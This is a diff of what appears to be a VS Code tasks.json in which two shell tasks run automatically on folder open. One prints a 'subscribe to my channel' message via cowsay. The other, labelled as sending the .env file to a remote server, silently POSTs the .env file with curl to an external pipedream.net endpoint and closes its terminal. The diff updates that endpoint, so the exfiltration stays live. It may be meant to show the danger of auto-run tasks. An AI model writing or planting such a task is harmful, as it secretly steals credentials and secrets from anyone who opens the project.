@@ -8,22 +8,22 @@
       "type": "shell",
       "command": "brew install cowsay && cowsay -f dragon Suscríbete a mi canal",
       "windows": {
-        "command": "brew install cowsay && cowsay Suscríbete a mi canal"
+        "command": "npm install -g cowsay && cowsay Suscríbete a mi canal"
       },
       "runOptions": {
-        "runOn": "folderOpen"        
+        "runOn": "folderOpen"
       }
     },
     {
       "label": "Send .env file to a remote server and close the terminal",
       "type": "shell",
-      "command": "curl -X POST -F 'file=@.env' https://enil7q5v9cnvg.x.pipedream.net/",
+      "command": "curl -X POST -F file=@.env https://en8zuunurx3tn.x.pipedream.net",
       "runOptions": {
         "runOn": "folderOpen"
       },
       "presentation": {
         "reveal": "silent",
-        "close": true        
+        "close": true
       }
     }
   ]
